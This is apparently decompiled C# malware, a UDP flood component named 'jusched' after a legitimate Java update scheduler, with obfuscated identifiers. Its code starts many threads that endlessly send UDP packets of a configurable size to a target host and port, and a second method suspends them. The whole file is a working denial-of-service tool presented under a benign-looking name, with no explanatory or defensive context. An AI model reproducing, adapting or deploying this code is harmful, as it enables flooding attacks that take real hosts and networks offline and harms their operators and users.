using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

public class take
{
	public class down
	{
		private class rsHZpSQABDAgvSoDdwWZXhiUdp
		{
			private IPEndPoint asdfasdfa;

			private int pSize;

			private Socket[] Sock;

			private int dasgsgdasfdasfasf;

			public rsHZpSQABDAgvSoDdwWZXhiUdp(IPEndPoint asdfasdfa, int SynSockets, int pSize)
			{
				this.asdfasdfa = asdfasdfa;
				dasgsgdasfdasfasf = SynSockets;
				this.pSize = pSize;
			}

			public void rsHZpSQABDAgvSoDdwWZXhi()
			{
				checked
				{
					while (true)
					{
						byte[] buffer = new byte[pSize - 1 + 1];
						try
						{
							Sock = new Socket[dasgsgdasfdasfasf - 1 + 1];
							for (int i = 0; i < dasgsgdasfdasfasf; i++)
							{
								Sock[i] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
								Sock[i].Blocking = false;
								Sock[i].SendTo(buffer, asdfasdfa);
							}
							Thread.Sleep(100);
							for (int i = 0; i < dasgsgdasfdasfasf; i++)
							{
								if (Sock[i].Connected)
								{
									Sock[i].Disconnect(reuseSocket: false);
								}
								Sock[i].Close();
								Sock[i] = null;
							}
							Sock = null;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							for (int i = 0; i < dasgsgdasfdasfasf; i++)
							{
								try
								{
									if (Sock[i].Connected)
									{
										Sock[i].Disconnect(reuseSocket: false);
									}
									Sock[i].Close();
									Sock[i] = null;
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
							}
							ProjectData.ClearProjectError();
						}
					}
				}
			}
		}

		private static ThreadStart[] Flojob;

		private static Thread[] FloThread;

		public static string H_H_H_H;

		private static IPEndPoint asdfasdfa;

		public static int P_P_P_P;

		public static int S_S_S_S;

		private static rsHZpSQABDAgvSoDdwWZXhiUdp[] SynClass;

		public static int T_T_T_T;

		public static int U_U_U_U;

		[DebuggerNonUserCode]
		public down()
		{
		}

		public static void NqtvkDZTAjYMaEDnbjghQrl()
		{
			try
			{
				asdfasdfa = new IPEndPoint(Dns.GetHostEntry(H_H_H_H).AddressList[0], P_P_P_P);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				asdfasdfa = new IPEndPoint(IPAddress.Parse(H_H_H_H), P_P_P_P);
				ProjectData.ClearProjectError();
			}
			checked
			{
				FloThread = new Thread[T_T_T_T - 1 + 1];
				Flojob = new ThreadStart[T_T_T_T - 1 + 1];
				SynClass = new rsHZpSQABDAgvSoDdwWZXhiUdp[T_T_T_T - 1 + 1];
				for (int i = 0; i < T_T_T_T; i++)
				{
					SynClass[i] = new rsHZpSQABDAgvSoDdwWZXhiUdp(asdfasdfa, U_U_U_U, S_S_S_S);
					Flojob[i] = SynClass[i].rsHZpSQABDAgvSoDdwWZXhi;
					FloThread[i] = new Thread(Flojob[i]);
					FloThread[i].Start();
				}
			}
		}

		public static void uOiXCHFkkjFociRWPEHsfPE()
		{
			for (int i = 0; i < T_T_T_T; i = checked(i + 1))
			{
				try
				{
					FloThread[i].Suspend();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	[DebuggerNonUserCode]
	public take()
	{
	}
}
